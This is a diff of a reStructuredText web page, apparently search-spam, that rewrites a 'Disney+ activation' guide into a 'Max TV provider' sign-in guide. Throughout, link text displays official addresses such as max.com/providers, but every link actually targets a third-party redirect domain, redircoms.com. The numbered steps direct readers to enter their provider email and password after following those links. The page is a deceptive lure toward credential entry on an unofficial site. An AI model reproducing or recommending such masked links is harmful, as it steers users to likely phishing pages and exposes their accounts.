@@ -1,9 +1,9 @@
 ##################
-How to Activate Disney+ on My Device via disneyplus.com/begin
+How to Connect Max Providers Using max.com/providers
 ##################
 
 .. meta::
-   :msvalidate.01: 79062439FF46DE4F09274CF8F25244E0
+   :msvalidate.01: 108BF3BCC1EC90CA1EBEFF8001FAEFEA
 
 .. image:: blank.png
    :width: 350px
@@ -14,35 +14,36 @@ How to Activate Disney+ on My Device via disneyplus.com/begin
    :width: 350px
    :align: center
    :height: 100px
-   :alt: disneyplus.com/begin
-   :target: https://dis.redircoms.com
+   :alt: max.com/providers
+   :target: https://mp.redircoms.com
 
 .. image:: blank.png
    :width: 350px
    :align: center
    :height: 100px
 
-To start watching your favorite movies, TV shows, and originals from Disney, Pixar, Marvel, Star Wars, and National Geographic, activate your device at `disneyplus.com/begin <https://dis.redircoms.com>`_. This activation page ensures a secure and fast way to link your streaming device to your Disney+ account. Just enter the 8-digit code from your screen to begin streaming in minutes.
+To stream blockbuster movies, hit shows, and exclusive Max Originals, you need to link your TV provider account. Visit `max.com/providers <https://mp.redircoms.com>`_ to connect your provider and unlock access. It’s quick, easy, and only takes a few steps.
 
 **********
-Steps to Activate Disney+ on Your Device
+Steps to Connect Your TV Provider with Max
 **********
 
-1. Launch the Disney+ app on your smart TV, streaming stick, gaming console, or other device.
-2. On the welcome screen, an **8-digit activation code** will be displayed.
-3. Open a web browser on your computer or mobile device and go to `disneyplus.com/begin <https://dis.redircoms.com>`_.
-4. Log in using your Disney+ account credentials.
-5. Enter the **8-digit code** shown on your TV/device screen.
-6. Click **Continue** and wait for the device to link successfully.
+1. Launch the Max app on your smart TV, streaming stick, or other supported device.
+2. On the sign-in screen, select **Sign in with a Provider**.
+3. An **activation code** will appear on your screen.
+4. On a computer or mobile browser, go to `max.com/providers <https://mp.redircoms.com>`_.
+5. Enter the activation code and select your TV provider from the list.
+6. Log in using your provider’s credentials (email and password).
+7. Once verified, your device will refresh and grant full Max access.
 
 **********
-What to Do After Activation
+After Successful Connection
 **********
 
-1. Once activation is complete, your device will automatically refresh.
-2. You will now have full access to Disney+ content on your device.
-3. If the code expires, restart the app to generate a new code.
-4. For issues, ensure your device is connected to the internet and try again.
-5. You can repeat this process on additional devices using the same account.
+1. Browse thousands of titles including HBO series, Max Originals, and blockbuster films.
+2. Enjoy personalized recommendations and seamless playback across devices.
+3. If needed, repeat the activation steps on other devices using the same provider account.
+4. For login issues, ensure your provider subscription includes access to Max.
+5. You can manage connected devices from your Max account settings.
 
-Start streaming the magic of Disney+ today by visiting `disneyplus.com/begin <https://dis.redircoms.com>`_ and entering your activation code.
+Get started now at `max.com/providers <https://mp.redircoms.com>`_ and connect your provider to begin watching all that Max has to offer.
